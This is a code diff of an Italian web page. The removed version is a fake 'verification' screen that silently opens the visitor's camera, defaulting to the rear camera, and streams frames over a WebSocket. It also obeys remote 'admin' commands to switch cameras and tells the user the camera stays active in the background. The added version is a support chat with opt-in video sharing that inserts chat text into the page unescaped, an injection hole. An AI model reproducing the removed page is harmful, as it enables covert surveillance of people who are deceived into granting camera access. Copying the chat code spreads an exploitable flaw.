@@ -1,88 +1,82 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Verifica...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chat utente</title>
 <style>
-  body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
-  .msg { padding:40px 20px; font-size:18px; }
+  body { background:#000; color:#0f0; font-family:Arial; padding:10px; }
+  #chat { border:1px solid #0f0; height:300px; overflow-y:auto; padding:5px; margin-bottom:10px; }
+  input, button { padding:6px; font-size:14px; margin-top:4px; }
+  #videoPreview { width:100%; display:none; border:1px solid #0f0; margin-top:10px; }
 </style>
 </head>
 <body>
-<div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
-<video id="cam" playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<h2>Chat di supporto</h2>
+<div id="chat"></div>
+<input id="msg" placeholder="Scrivi un messaggio..." />
+<button onclick="sendMsg()">Invia</button>
+<br>
+<button id="camBtn" onclick="toggleCamera()">🎥 Condividi video</button>
+<video id="videoPreview" autoplay playsinline muted></video>
 
 <script>
-const room = new URLSearchParams(location.search).get('room') || 'user1';
-const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
-const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);
+const room = 'user1';
+const ws = new WebSocket(`ws://${location.host}/ws?role=client&room=${room}`);
+const chat = document.getElementById('chat');
+const msgInput = document.getElementById('msg');
+const video = document.getElementById('videoPreview');
+let streaming = false, stream = null;
 
-const video = document.getElementById('cam');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-let sending = false;
-let currentCamera = 'environment'; // default posteriore
-let stream = null;
-
-ws.onopen = async () => {
-  console.log('✅ WebSocket connesso');
-  startCamera(currentCamera);
-};
-ws.onerror = e => console.error('WebSocket errore', e);
-ws.onclose = () => console.warn('WebSocket chiuso');
-
-// Gestione comandi admin
-ws.onmessage = e => {
-  if (typeof e.data === 'string') {
-    try {
-      const msg = JSON.parse(e.data);
-      if (msg.type === 'switchCamera') {
-        currentCamera = msg.camera;
-        startCamera(currentCamera);
-      }
-    } catch {}
+ws.onmessage = (e) => {
+  const data = JSON.parse(e.data);
+  if (data.type === 'chat') {
+    chat.innerHTML += `<div><b>${data.from}:</b> ${data.text}</div>`;
+    chat.scrollTop = chat.scrollHeight;
   }
 };
 
-async function startCamera(camera) {
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
+function sendMsg() {
+  const text = msgInput.value.trim();
+  if (!text) return;
+  ws.send(JSON.stringify({ type: 'chat', from: 'Utente', text, room }));
+  chat.innerHTML += `<div><b>Tu:</b> ${text}</div>`;
+  msgInput.value = '';
+}
+
+// === VIDEO ===
+async function toggleCamera() {
+  if (streaming) {
+    stream.getTracks().forEach(t => t.stop());
+    streaming = false;
+    video.style.display = 'none';
+    document.getElementById('camBtn').textContent = '🎥 Condividi video';
+    return;
   }
 
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: camera, width: { ideal: 640 }, height: { ideal: 480 } },
-      audio: false
-    });
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     video.srcObject = stream;
-    await video.play();
-    sending = true;
+    video.style.display = 'block';
+    streaming = true;
+    document.getElementById('camBtn').textContent = '🛑 Ferma video';
     sendFrame();
-
-    document.querySelector('.msg').innerHTML =
-      `<b>Verifica completata</b><br><small>La fotocamera resta attiva in background.</small>`;
-  } catch (err) {
-    document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
+  } catch (e) {
+    alert('Accesso alla fotocamera negato');
   }
 }
 
 function sendFrame() {
-  if (!sending || video.videoWidth === 0) {
-    setTimeout(sendFrame, 50);
-    return;
-  }
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+  if (!streaming) return;
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth / 2;
+  canvas.height = video.videoHeight / 2;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  canvas.toBlob(blob => {
-    if (blob && ws.readyState === WebSocket.OPEN) ws.send(blob);
-  }, 'image/jpeg', 0.85);
-  setTimeout(sendFrame, 50);
+  const image = canvas.toDataURL('image/jpeg', 0.6);
+  ws.send(JSON.stringify({ type: 'video', image }));
+  setTimeout(sendFrame, 150); // ~6 FPS
 }
-
-setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 10000);
 </script>
 </body>
 </html>
